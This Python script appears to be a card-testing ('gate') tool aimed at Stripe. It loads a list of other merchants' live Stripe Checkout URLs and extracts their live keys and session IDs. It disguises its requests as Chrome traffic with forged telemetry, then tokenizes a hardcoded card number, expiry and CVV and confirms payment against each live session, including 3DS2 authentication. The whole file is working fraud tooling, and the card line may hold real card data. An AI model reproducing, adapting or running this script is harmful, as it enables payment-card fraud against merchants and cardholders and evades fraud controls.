import asyncio
import json
import os
import sys
import time
import uuid

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from curl_cffi.requests import AsyncSession
import gate_client as gc
import stripe_fid

TEST_CARD_3DS = "4937241006643332|02|31|275"

async def test_all_targets():
    with open("data/hit_targets.txt", "r", encoding="utf-8") as f:
        targets = [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]
    
    print(f"Loaded {len(targets)} targets")
    
    for idx, target_url in enumerate(targets):
        print(f"\n================ Target {idx}: {target_url[:50]}... ================")
        try:
            d = stripe_fid.decode_fragment(target_url)
            pk = str(d.get("apiKey") or "")
            cs = str(d.get("checkoutSessionId") or "")
            if not pk.startswith("pk_live") or not cs.startswith("cs_"):
                print("Bad fid fragment, skipping")
                continue
            
            async with AsyncSession(impersonate="chrome131", verify=False) as s:
                r = await s.get(f"https://api.stripe.com/v1/payment_pages/{cs}",
                                params={"key": pk},
                                headers={"Origin": "https://js.stripe.com",
                                         "Referer": "https://js.stripe.com/",
                                         "Accept": "application/json"}, timeout=12)
                if r.status_code != 200:
                    print(f"GET payment_pages HTTP {r.status_code}")
                    continue
                data = r.json()
                pi = data.get("payment_intent") or {}
                status = pi.get("status")
                amount = pi.get("amount", 0)
                currency = pi.get("currency", "")
                checksum = data.get("init_checksum", "")
                print(f"Session: PI {pi.get('id')} status={status} {amount}{currency}")
                if status != "requires_payment_method":
                    print("Session not in requires_payment_method")
                    continue
                
                # Tokenize
                card = gc.parse_card(TEST_CARD_3DS)
                telem = gc.stripe_telemetry(target_url, pk)
                r_tok = await s.post("https://api.stripe.com/v1/payment_methods",
                                     data=gc.tokenize_body(card, telem, target_url),
                                     headers=gc.TOKENIZE_HEADERS, timeout=10)
                tok_data = r_tok.json()
                pm_id = tok_data.get("id")
                if not pm_id:
                    print("Tokenize failed:", tok_data)
                    continue
                print(f"Tokenized: {pm_id}")
                
                # Confirm
                body = {
                    "key": pk,
                    "eid": "NA",
                    "payment_method": pm_id,
                    "expected_payment_method_type": "card",
                    "expected_amount": str(amount),
                    "return_url": target_url.split("#")[0],
                }
                if checksum:
                    body["init_checksum"] = checksum
                
                r_conf = await s.post(f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
                                      data=body,
                                      headers={"Origin": "https://js.stripe.com",
                                               "Referer": "https://js.stripe.com/",
                                               "Accept": "application/json"}, timeout=20)
                conf_resp = r_conf.json()
                print(f"Confirm HTTP {r_conf.status_code}:", json.dumps(conf_resp, indent=2)[:300])
                
                pi_conf = conf_resp.get("payment_intent") or {}
                print("PI Status:", pi_conf.get("status"))
                na = pi_conf.get("next_action") or {}
                print("Next Action:", json.dumps(na, indent=2))
                
                # If requires_action
                source_id = None
                if na.get("type") == "use_stripe_sdk":
                    sdk = na.get("use_stripe_sdk") or {}
                    source_id = sdk.get("three_d_secure_2_source") or sdk.get("source") or sdk.get("three_d_secure_2")
                elif na.get("type") == "redirect_to_url":
                    print("Redirect URL:", na.get("redirect_to_url", {}).get("url"))
                
                if source_id:
                    print(f"Found 3DS2 source: {source_id}")
                    res_3ds = await gc.stripe_3ds2_authenticate(s, pk, source_id)
                    print("3DS2 Authenticate Response:", json.dumps(res_3ds, indent=2))
                    
        except Exception as e:
            print(f"Error on target {idx}: {e}")

if __name__ == "__main__":
    asyncio.run(test_all_targets())
